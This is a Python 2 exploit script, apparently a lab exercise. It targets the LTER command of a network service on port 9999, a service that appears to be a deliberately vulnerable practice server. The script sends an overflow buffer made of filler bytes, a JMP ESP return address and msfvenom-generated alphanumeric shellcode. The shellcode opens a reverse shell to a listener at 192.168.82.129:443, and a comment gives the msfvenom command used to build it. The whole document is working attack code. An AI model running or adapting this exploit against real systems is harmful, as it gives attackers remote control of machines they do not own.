#!/usr/bin/python

import sys, socket

ip = "192.168.82.128"
port = 9999

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	print "[*] Connection successful"
except:
	print "[!] Connection failed.  Exiting..."
	sys.exit(1)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.82.129 LPORT=443 -f c --arch x86 --platform windows -e x86/alpha_mixed BufferRegister=ESP -b "\x00\x0a\x0d"
# Payload size: 702 bytes
# It was necessary to use the BufferRegister option to remove the leading payload bytes which were non-alpha.  It did not work otherwise
shellcode = (
"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x38\x68\x6f\x72\x57\x70"
"\x65\x50\x47\x70\x43\x50\x6b\x39\x6a\x45\x64\x71\x59\x50\x62"
"\x44\x6e\x6b\x56\x30\x46\x50\x4c\x4b\x71\x42\x34\x4c\x6c\x4b"
"\x62\x72\x52\x34\x4e\x6b\x32\x52\x44\x68\x36\x6f\x4c\x77\x71"
"\x5a\x47\x56\x56\x51\x6b\x4f\x4e\x4c\x35\x6c\x50\x61\x71\x6c"
"\x65\x52\x66\x4c\x47\x50\x49\x51\x4a\x6f\x36\x6d\x45\x51\x6a"
"\x67\x6d\x32\x69\x62\x71\x42\x62\x77\x4c\x4b\x62\x72\x34\x50"
"\x4c\x4b\x61\x5a\x57\x4c\x6e\x6b\x30\x4c\x57\x61\x51\x68\x58"
"\x63\x72\x68\x53\x31\x5a\x71\x62\x71\x6e\x6b\x73\x69\x45\x70"
"\x77\x71\x58\x53\x4e\x6b\x31\x59\x35\x48\x49\x73\x74\x7a\x47"
"\x39\x4e\x6b\x77\x44\x6c\x4b\x33\x31\x4e\x36\x44\x71\x4b\x4f"
"\x4e\x4c\x6b\x71\x78\x4f\x64\x4d\x36\x61\x48\x47\x37\x48\x4d"
"\x30\x33\x45\x59\x66\x33\x33\x51\x6d\x48\x78\x75\x6b\x43\x4d"
"\x61\x34\x61\x65\x4a\x44\x32\x78\x4c\x4b\x62\x78\x36\x44\x65"
"\x51\x48\x53\x72\x46\x6c\x4b\x56\x6c\x32\x6b\x4c\x4b\x50\x58"
"\x77\x6c\x73\x31\x7a\x73\x4c\x4b\x57\x74\x6c\x4b\x33\x31\x6a"
"\x70\x4e\x69\x33\x74\x47\x54\x55\x74\x71\x4b\x53\x6b\x75\x31"
"\x72\x79\x33\x6a\x63\x61\x39\x6f\x6d\x30\x33\x6f\x51\x4f\x53"
"\x6a\x4c\x4b\x47\x62\x68\x6b\x6e\x6d\x73\x6d\x33\x58\x76\x53"
"\x37\x42\x65\x50\x67\x70\x61\x78\x64\x37\x62\x53\x44\x72\x31"
"\x4f\x46\x34\x75\x38\x62\x6c\x42\x57\x34\x66\x33\x37\x79\x6f"
"\x39\x45\x6f\x48\x4e\x70\x43\x31\x73\x30\x43\x30\x37\x59\x4a"
"\x64\x53\x64\x46\x30\x51\x78\x47\x59\x6b\x30\x30\x6b\x77\x70"
"\x6b\x4f\x4a\x75\x52\x70\x46\x30\x46\x30\x76\x30\x63\x70\x32"
"\x70\x67\x30\x30\x50\x71\x78\x6b\x5a\x46\x6f\x4b\x6f\x59\x70"
"\x4b\x4f\x48\x55\x5a\x37\x53\x5a\x57\x75\x72\x48\x4b\x70\x59"
"\x38\x30\x52\x6d\x51\x71\x78\x46\x62\x35\x50\x46\x61\x4d\x6b"
"\x6e\x69\x49\x76\x62\x4a\x66\x70\x63\x66\x61\x47\x70\x68\x6f"
"\x69\x39\x35\x71\x64\x51\x71\x6b\x4f\x6b\x65\x6c\x45\x39\x50"
"\x64\x34\x64\x4c\x79\x6f\x32\x6e\x47\x78\x53\x45\x7a\x4c\x50"
"\x68\x48\x70\x4e\x55\x4e\x42\x70\x56\x69\x6f\x79\x45\x30\x68"
"\x73\x53\x42\x4d\x55\x34\x77\x70\x6d\x59\x48\x63\x36\x37\x73"
"\x67\x51\x47\x34\x71\x58\x76\x31\x7a\x34\x52\x46\x39\x66\x36"
"\x6d\x32\x49\x6d\x53\x56\x6f\x37\x61\x54\x76\x44\x67\x4c\x45"
"\x51\x45\x51\x6e\x6d\x63\x74\x36\x44\x66\x70\x6b\x76\x67\x70"
"\x57\x34\x72\x74\x52\x70\x62\x76\x43\x66\x43\x66\x71\x56\x72"
"\x76\x72\x6e\x43\x66\x30\x56\x56\x33\x61\x46\x61\x78\x42\x59"
"\x4a\x6c\x47\x4f\x4e\x66\x6b\x4f\x48\x55\x6f\x79\x79\x70\x32"
"\x6e\x42\x76\x43\x76\x69\x6f\x76\x50\x70\x68\x76\x68\x4b\x37"
"\x35\x4d\x45\x30\x59\x6f\x68\x55\x6f\x4b\x4a\x50\x4e\x55\x4f"
"\x52\x43\x66\x72\x48\x69\x36\x6c\x55\x4f\x4d\x4f\x6d\x69\x6f"
"\x79\x45\x65\x6c\x54\x46\x61\x6c\x65\x5a\x6d\x50\x69\x6b\x69"
"\x70\x70\x75\x35\x55\x6f\x4b\x62\x67\x74\x53\x71\x62\x70\x6f"
"\x73\x5a\x75\x50\x63\x63\x49\x6f\x4b\x65\x41\x41")


# [*] Exact match at offset 2003
# JMP ESP 62501203

evil = "\x41" * 2003 + "\x03\x12\x50\x62" + shellcode + "\x43" * (3000 - 2003 - 4 - len(shellcode))

buffer = "LTER /.:/" + evil + "\r\n"

s.recv(1024)
s.send(buffer)
s.close